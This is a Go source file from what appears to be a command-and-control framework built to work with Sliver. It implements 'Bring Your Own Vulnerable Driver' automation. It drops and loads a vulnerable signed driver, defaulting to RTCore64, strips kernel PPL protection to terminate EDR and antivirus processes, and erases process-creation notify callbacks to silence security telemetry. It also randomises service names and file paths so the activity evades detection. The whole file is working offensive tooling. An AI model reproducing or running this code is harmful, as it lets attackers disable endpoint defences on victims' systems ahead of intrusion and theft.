package byovd

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// BYOVD (Bring Your Own Vulnerable Driver) automation.
//
// Entry point for the Sliver operator: given a path to a known-vulnerable
// signed driver binary, this module:
//
//  1. Writes the driver bytes to a temp path on disk.
//  2. Loads the driver via the Service Control Manager.
//  3. Opens the driver's device interface.
//  4. Depending on the requested action:
//     a. KillEDRs   — enumerate running EDR/AV processes and terminate each
//                     one by first stripping its PPL protection in the kernel.
//     b. BlindEDRs  — remove all third-party PspCreateProcessNotifyRoutine
//                     callbacks so EDR telemetry goes silent.
//     c. Both       — run BlindEDRs then KillEDRs.
//  5. Unloads the driver service and deletes the temp driver file.
//
// All kernel operations go through the KernelRW interface so future drivers
// can be added without changing the orchestration logic.

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// Action controls what the BYOVD module does once the driver is loaded.
type Action int

const (
	ActionListEDRs  Action = iota // only enumerate, do not act
	ActionKillEDRs                // terminate EDR processes (strips PPL first)
	ActionBlindEDRs               // zero kernel notify callbacks only
	ActionFull                    // BlindEDRs + KillEDRs
)

// Result contains the outcome of a BYOVD operation.
type Result struct {
	EDRsFound       []EDRProcess
	KilledPIDs      []uint32
	KillErrors      []string
	CallbacksRemoved int
	CallbackError   string
}

// Run is the main entry point called by the Sliver handler.
//
// driverPath is the full path to the vulnerable driver binary already on disk
// (uploaded by the operator via the `upload` command before calling byovd).
// driverDesc selects which driver protocol to use (must match a KnownDrivers
// entry by Name). If driverDesc is empty, RTCore64 is assumed.
func Run(driverPath string, driverDesc string, action Action) (*Result, error) {
	desc, err := resolveDriver(driverDesc)
	if err != nil {
		return nil, err
	}

	// Use a randomised service name to avoid IOCs tied to the driver's real name.
	svcName := randomServiceName()
	absPath, err := filepath.Abs(driverPath)
	if err != nil {
		return nil, fmt.Errorf("abs path: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[byovd] loading driver=%s svc=%s action=%d", absPath, svcName, action)
	// {{end}}

	svcHandle, err := loadDriver(svcName, absPath)
	if err != nil {
		return nil, fmt.Errorf("load driver: %w", err)
	}
	defer func() {
		unloadDriver(svcHandle, svcName)
		// {{if .Config.Debug}}
		log.Printf("[byovd] driver unloaded and service deleted")
		// {{end}}
	}()

	dev, err := desc.Open(svcName)
	if err != nil {
		return nil, fmt.Errorf("open device '%s': %w", desc.DevicePath, err)
	}
	defer dev.Close()

	res := &Result{}

	edrs, err := ListEDRProcesses()
	if err != nil {
		// Non-fatal: log and continue.
		// {{if .Config.Debug}}
		log.Printf("[byovd] ListEDRProcesses error: %v", err)
		// {{end}}
	}
	res.EDRsFound = edrs

	if action == ActionListEDRs {
		return res, nil
	}

	if action == ActionBlindEDRs || action == ActionFull {
		n, err := RemoveProcessCallbacks(dev)
		res.CallbacksRemoved = n
		if err != nil {
			res.CallbackError = err.Error()
			// {{if .Config.Debug}}
			log.Printf("[byovd] RemoveProcessCallbacks error: %v", err)
			// {{end}}
		}
		// {{if .Config.Debug}}
		log.Printf("[byovd] removed %d process notify callbacks", n)
		// {{end}}
	}

	if action == ActionKillEDRs || action == ActionFull {
		for _, edr := range edrs {
			if err := KillProcessViaDriver(dev, edr.PID); err != nil {
				res.KillErrors = append(res.KillErrors,
					fmt.Sprintf("PID %d (%s): %v", edr.PID, edr.Name, err))
				// {{if .Config.Debug}}
				log.Printf("[byovd] kill PID %d (%s) failed: %v", edr.PID, edr.Name, err)
				// {{end}}
			} else {
				res.KilledPIDs = append(res.KilledPIDs, edr.PID)
			}
		}
	}

	return res, nil
}

// DropAndRun writes driverBytes to a temp file, then calls Run.
// The temp file is deleted after the driver is unloaded.
func DropAndRun(driverBytes []byte, driverDesc string, action Action) (*Result, error) {
	tmp, err := os.CreateTemp(os.TempDir(), "*.sys")
	if err != nil {
		return nil, fmt.Errorf("create temp file: %w", err)
	}
	tmpPath := tmp.Name()
	defer os.Remove(tmpPath)

	if _, err := tmp.Write(driverBytes); err != nil {
		tmp.Close()
		return nil, fmt.Errorf("write driver bytes: %w", err)
	}
	tmp.Close()

	// Give SCM time to notice the file.
	time.Sleep(200 * time.Millisecond)

	return Run(tmpPath, driverDesc, action)
}

// TempDriverPath returns a plausible temp path for a driver file that blends
// in with legitimate Windows driver staging directories.
func TempDriverPath() string {
	dirs := []string{
		os.TempDir(),
		filepath.Join(os.Getenv("WINDIR"), "Temp"),
		filepath.Join(os.Getenv("PROGRAMDATA"), "Microsoft", "Windows", "Caches"),
	}
	for _, d := range dirs {
		if _, err := os.Stat(d); err == nil {
			return filepath.Join(d, randomServiceName()+".sys")
		}
	}
	return filepath.Join(os.TempDir(), randomServiceName()+".sys")
}

// resolveDriver finds a DriverDesc by Name, defaulting to RTCore64.
func resolveDriver(name string) (DriverDesc, error) {
	if name == "" {
		name = "RTCore64"
	}
	name = strings.ToLower(name)
	for _, d := range KnownDrivers {
		if strings.ToLower(d.Name) == name {
			return d, nil
		}
	}
	return DriverDesc{}, fmt.Errorf("unknown driver '%s'; supported: %s",
		name, knownDriverNames())
}

func knownDriverNames() string {
	names := make([]string, len(KnownDrivers))
	for i, d := range KnownDrivers {
		names[i] = d.Name
	}
	return strings.Join(names, ", ")
}

// randomServiceName generates a short lowercase alphanumeric service name
// that does not obviously reveal its purpose.
func randomServiceName() string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	r := rand.New(rand.NewSource(time.Now().UnixNano() ^ int64(windows.GetCurrentProcessId())))
	b := make([]byte, 8)
	for i := range b {
		b[i] = charset[r.Intn(len(charset))]
	}
	return string(b)
}
